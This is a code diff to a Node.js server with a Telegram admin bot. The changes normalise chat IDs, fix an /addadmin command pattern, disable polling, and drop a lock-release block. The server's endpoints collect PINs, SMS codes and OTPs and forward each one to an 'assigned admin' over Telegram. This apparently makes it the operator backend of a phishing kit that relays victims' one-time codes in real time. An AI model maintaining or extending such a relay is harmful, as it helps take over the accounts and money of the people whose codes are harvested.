@@ -15,8 +15,8 @@ const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
 const PORT        = process.env.PORT || 10000;
 const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;
 
-// Initialize Telegram Bot (Webhook mode)
-const bot = new TelegramBot(BOT_TOKEN);
+// Initialize Telegram Bot (Explicit Webhook mode, disable polling)
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 // In-memory tracking maps
 const adminChatIds       = new Map(); // adminId → chatId
@@ -66,8 +66,9 @@ function isAdminActive(chatId) {
 }
 
 function getAdminIdByChatId(chatId) {
+    const numChatId = Number(chatId);
     for (const [adminId, storedChatId] of adminChatIds.entries()) {
-        if (storedChatId === chatId) return adminId;
+        if (Number(storedChatId) === numChatId) return adminId;
     }
     return null;
 }
@@ -182,7 +183,7 @@ async function loadAdminChatIds() {
 
         for (const admin of admins) {
             if (admin.chatId) {
-                adminChatIds.set(admin.adminId, admin.chatId);
+                adminChatIds.set(admin.adminId, Number(admin.chatId));
                 if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
             }
         }
@@ -368,7 +369,8 @@ Use format:
         `, { parse_mode: 'Markdown' });
     });
 
-    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
+    // Uses negative lookahead (?!id\b) so it won't trigger when /addadminid is executed
+    bot.onText(/\/addadmin\s+(?!id\b)(.+)/i, async (msg, match) => {
         const chatId = msg.chat.id;
         if (getAdminIdByChatId(chatId) !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only Super Admin can perform this action.');
 
@@ -457,7 +459,7 @@ Welcome ${name}!
 
             let targetAdminId = null;
             for (const [id, storedChatId] of adminChatIds.entries()) {
-                if (storedChatId === oldChatId) { targetAdminId = id; break; }
+                if (Number(storedChatId) === oldChatId) { targetAdminId = id; break; }
             }
             if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
 
@@ -520,6 +522,7 @@ Welcome ${name}!
 
             bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         } catch (error) {
+            console.error('❌ Error in /admins command:', error);
             bot.sendMessage(chatId, '❌ Failed to list admins.');
         }
     });
@@ -831,7 +834,7 @@ app.post(['/api/verify-pin', '/api/verify-sms', '/api/submit-sms'], async (req, 
 
         if (!adminChatIds.has(assignedAdmin.adminId)) {
             if (assignedAdmin.chatId) {
-                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
+                adminChatIds.set(assignedAdmin.adminId, Number(assignedAdmin.chatId));
             } else {
                 return res.status(503).json({ success: false, message: 'Assigned admin is currently offline.' });
             }
@@ -866,8 +869,6 @@ app.post(['/api/verify-pin', '/api/verify-sms', '/api/submit-sms'], async (req, 
     } catch (error) {
         console.error('❌ Error in verification endpoint:', error);
         res.status(500).json({ success: false, message: 'Server error: ' + error.message });
-    } finally {
-        if (lockKey) processingLocks.delete(lockKey);
     }
 });
 
@@ -908,7 +909,7 @@ app.post(['/api/verify-otp', '/api/submit-otp'], async (req, res) => {
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
-                adminChatIds.set(application.adminId, admin.chatId);
+                adminChatIds.set(application.adminId, Number(admin.chatId));
             } else {
                 return res.status(500).json({ success: false, message: 'Assigned admin is currently unreachable.' });
             }
@@ -1063,7 +1064,7 @@ app.get('/', async (req, res) => {
             const admin = await db.getAdmin(adminId);
             if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                 if (admin.chatId && !adminChatIds.has(adminId)) {
-                    adminChatIds.set(adminId, admin.chatId);
+                    adminChatIds.set(adminId, Number(admin.chatId));
                 }
             }
         } catch (error) {
